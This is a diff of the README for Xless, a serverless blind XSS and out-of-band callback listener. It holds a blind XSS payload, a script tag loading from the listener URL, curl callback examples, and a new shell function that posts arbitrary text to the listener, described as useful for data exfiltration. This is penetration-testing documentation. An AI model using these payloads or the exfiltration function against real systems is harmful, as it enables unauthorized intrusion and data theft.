@@ -15,7 +15,7 @@
 </p>
 
 ## :information_source: About The Project
-**Xless** is a serverless Blind XSS (bXSS) application that can be used to identify Blind XSS vulnerabilities using your own deployed version of the application.  
+**Xless** is a serverless Blind XSS (bXSS) application that can be used to identify Blind XSS vulnerabilities using your own deployed version of the application.
 There is no need to run a full deployment process; just setup a [vercel.com](https://vercel.com/) account and run `bash deploy.sh`.
 That's it. You now have a fully-running Blind XSS listener that uses Slack to notify you for callbacks.
 
@@ -32,7 +32,7 @@ That's it. You now have a fully-running Blind XSS listener that uses Slack to no
 $ bash deploy.sh
 
 > Deploying ~/xless under X
-> https://xless.vercel.app [v2] [in clipboard] [4s]
+> https://custom-xless-deployment.vercel.app [v2] [in clipboard] [4s]
 > Success! Deployment ready [4s]
 ```
 2. Use the URL for blind XSS testing :fire:
@@ -43,7 +43,7 @@ $ bash deploy.sh
 ## :speech_balloon: Example Payload
 
 ```html
-<script src="https://xless.vercel.app"></script>
+<script src="https://custom-xless-deployment.vercel.app"></script>
 ```
 
 
@@ -72,7 +72,7 @@ Xless also works as an OOB (Out-of-Band) callbacks listener for HTTP/HTTPS reque
 ## :eyes: Demo
 
 ```bash
-$ curl https://xless.vercel.app/callback-canary
+$ curl https://custom-xless-deployment.vercel.app/callback-canary
 ```
 
 ![OOB CallBack Listener Demo](https://raw.githubusercontent.com/mazen160/public/master/static/images/xless-screenshot-oob-callback-example.png)
@@ -80,7 +80,7 @@ $ curl https://xless.vercel.app/callback-canary
 Or anything random, such as:
 
 ```bash
-$ curl https://xless.vercel.app/88bf0ecd
+$ curl https://custom-xless-deployment.vercel.app/88bf0ecd
 ```
 
 
@@ -91,16 +91,28 @@ The current tests are the existance of the API keys and a successful image uploa
 ##  Example Blind XSS payloads
 
 You can view a number of handy XSS payloads for your xless app at `$URL/examples`
-* URL: `https://xless.vercel.app/examples`
+* URL: `https://custom-xless-deployment.vercel.app/examples`
 Once you deploy your app, you can find the examples there.
+
+## :envelope_with_arrow: Scriptable Messages
+
+You can use Xless to send direct messages to your listener. It can be useful in data exfiltration or as a scriptable way to send messages and alerts to your Slack app.
+
+```shell
+# on your (bashrc / zshrch) file:
+function xless() {
+  curl -s https://custom-xless-deployment.vercel.app/message --data "text=$1"
+}
+```
 
 
 ## Contribution
 Contribution is very welcome. Please share your ideas by Github issues and pull requests.
 
 Here are some ideas to start with:
-1. Enabling sharing of page screenshot - Check `test.payload.js`.
-2. _Your idea of a new feature_?
+1. ~~Enabling sharing of page screenshot~~.
+2. ~~Scriptable message~~.
+3. _Your idea of a new feature_?
 
 
 ## Acknowledgement
